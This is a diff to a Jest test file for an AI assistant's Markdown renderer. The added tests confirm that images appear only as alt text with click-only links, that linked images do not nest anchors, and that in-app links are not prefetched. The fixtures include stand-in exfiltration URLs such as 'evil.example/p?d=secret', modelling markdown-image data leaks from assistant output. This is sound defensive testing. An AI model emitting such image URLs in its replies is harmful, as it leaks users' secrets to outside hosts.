@@ -1,7 +1,7 @@
 jest.mock('next/link', () => ({
     __esModule: true,
-    default: ({ href, children, ...rest }: { href: string; children: React.ReactNode }) => (
-        <a href={href} data-next-link="true" {...rest}>
+    default: ({ href, children, prefetch, ...rest }: { href: string; children: React.ReactNode; prefetch?: boolean }) => (
+        <a href={href} data-next-link="true" data-prefetch={String(prefetch)} {...rest}>
             {children}
         </a>
     ),
@@ -12,6 +12,25 @@ import { render, screen } from '@testing-library/react';
 import { Markdown, isInAppHref } from '@/component-library/features/assistant/Markdown';
 
 describe('Markdown', () => {
+    it('renders reference-style images as alt text plus a click-only link', () => {
+        const { container } = render(<Markdown text={'![the ref][r]\n\n[r]: https://evil.example/p?d=secret'} />);
+        expect(container.querySelector('img')).toBeNull();
+        expect(screen.getByText('the ref').closest('a')).toHaveAttribute('href', 'https://evil.example/p?d=secret');
+    });
+
+    it('does not nest anchors for linked images', () => {
+        const { container } = render(<Markdown text={'[![inner alt](https://evil.example/a.png)](https://example.org/target)'} />);
+        expect(container.querySelector('img')).toBeNull();
+        expect(container.querySelectorAll('a a')).toHaveLength(0);
+        expect(container.querySelectorAll('a')).toHaveLength(1);
+        expect(screen.getByText('inner alt').closest('a')).toHaveAttribute('href', 'https://example.org/target');
+    });
+
+    it('does not prefetch in-app links', () => {
+        render(<Markdown text={'[rule](/rule/abc)'} />);
+        expect(screen.getByText('rule').closest('a')).toHaveAttribute('data-prefetch', 'false');
+    });
+
     it('never renders an img element for markdown images, only alt text and a click-only link', () => {
         const { container } = render(<Markdown text={'![the alt](https://evil.example/p?d=secret) and ![](/local.png)'} />);
         expect(container.querySelector('img')).toBeNull();
